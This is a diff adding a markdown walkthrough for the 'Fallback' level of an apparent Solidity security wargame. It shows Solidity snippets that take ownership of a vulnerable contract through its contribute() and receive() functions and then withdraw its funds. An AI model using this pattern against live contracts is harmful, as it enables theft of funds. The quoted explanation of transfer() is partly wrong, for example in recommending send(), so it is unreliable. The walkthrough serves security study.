@@ -69,3 +69,97 @@ function testExploit() public {
     * Matter of fact article
 * https://blog.openzeppelin.com/ethereum-in-depth-part-2-6339cf6bddb9/
     * See `Storage` section. Includes assembly.
+
+## 01 Fallback
+
+To beat this level, we need to comply with
+
+```solidity
+instance.owner() == _player && address(instance).balance == 0;
+```
+
+### Solution
+
+Notice that the `receive()` function can make `msg.sender` the owner of the contract
+
+```solidity
+receive() external payable {
+  require(msg.value > 0 && contributions[msg.sender] > 0);
+  owner = msg.sender;
+}
+```
+
+Alas, we need to add some money to `contributions`:
+
+```solidity
+function contribute() public payable {
+  require(msg.value < 0.001 ether);
+  contributions[msg.sender] += msg.value;
+  if(contributions[msg.sender] > contributions[owner]) {
+    owner = msg.sender;
+  }
+}
+```
+
+So, to solve this level:
+
+* First, we call `contribute()` with one wei, then we `call()` the contract  with another wei (`msg.value > 0` control).
+* After that we are the owner of the contract and can `withdraw()` the funds.
+* Now, notice that in our test we are invoking the level from a contract (as opposed from an EOA), so we need to include a `receive()` function ourselves.
+
+```solidity
+// make this true
+// contributions[msg.sender] > 0
+challenge.contribute{value: 1 wei}();
+```
+
+```solidity
+// trigger code in receive()
+(bool success,) = address(challengeAddress).call{value: 1 wei}("");
+```
+
+```solidity
+// See the comment in receive() below
+challenge.withdraw();
+```
+
+```solidity
+// we need a receive function, since we are receiving
+// the funds here and this is not an EOA
+receive() external payable {}
+```
+
+### References
+
+A review on `receive()` and `fallback()` functions
+
+```
+           send Ether
+               |
+         msg.data is empty?
+              / \
+            yes  no
+            /     \
+receive() exists?  fallback()
+         /   \
+        yes   no
+        /      \
+    receive()   fallback()
+```
+
+Review, why is not recommended to use the `transfer()` function
+
+> The transfer() function in Solidity is used to send ether (the cryptocurrency used on the Ethereum network) from one address to another. This function was originally introduced as a simple way to transfer ether and was widely used in smart contracts.
+
+> However, the transfer() function has a limitation that can cause problems in some situations. The function limits the amount of gas used to send the transaction to 2300 gas. If the receiving contract requires more than 2300 gas to process the transaction, the transfer will fail and the ether will be returned to the sender.
+
+> This can lead to unexpected behavior and security issues, as it can allow attackers to cause denial-of-service attacks by creating contracts that require more than 2300 gas to process a transfer. For this reason, the use of transfer() is no longer recommended for sending large amounts of ether or for interacting with complex contracts.
+
+> Instead, the recommended approach is to use the send() or call() functions, which allow for more fine-grained control over the gas limit and provide more robust error handling. Additionally, newer Solidity versions have introduced the payable modifier for functions, which makes it easier to handle incoming ether payments.
+
+Other links for further reading
+
+* https://docs.soliditylang.org/en/v0.8.18/contracts.html#receive-ether-function
+* https://docs.soliditylang.org/en/v0.8.18/contracts.html#fallback-function
+* https://solidity-by-example.org/fallback/
+* https://solidity-by-example.org/sending-ether/
